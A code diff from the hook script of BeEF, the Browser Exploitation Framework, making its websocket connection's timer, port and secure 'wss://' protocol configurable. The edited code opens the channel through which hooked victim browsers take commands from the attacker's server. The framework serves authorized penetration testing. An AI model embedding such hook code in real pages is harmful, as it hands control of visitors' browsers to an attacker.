@@ -20,19 +20,22 @@
 beef.websocket = {
 
     socket:null,
-
-    alive_timer:5000,
+    alive_timer:<%= @websocket_timer %>,
 
     init:function () {
         var webSocketServer = beef.net.host;
-        var webSocketPort = 11989;
+        var webSocketPort = <%= @websocket_port %>;
+        var webSocketSecure = <%= @websocket_secure %>;
+        var protocol = "ws://";
+
+        if(webSocketSecure)
+            protocol = "wss://";
 
         if (beef.browser.isFF() && !!window.MozWebSocket) {
-            beef.websocket.socket = new MozWebSocket("ws://" + webSocketServer + ":" + webSocketPort + "/");
+            beef.websocket.socket = new MozWebSocket(protocol + webSocketServer + ":" + webSocketPort + "/");
 
         } else {
-            beef.websocket.socket = new WebSocket("ws://" + webSocketServer + ":" + webSocketPort + "/");
-
+            beef.websocket.socket = new WebSocket(protocol + webSocketServer + ":" + webSocketPort + "/");
         }
 
     },
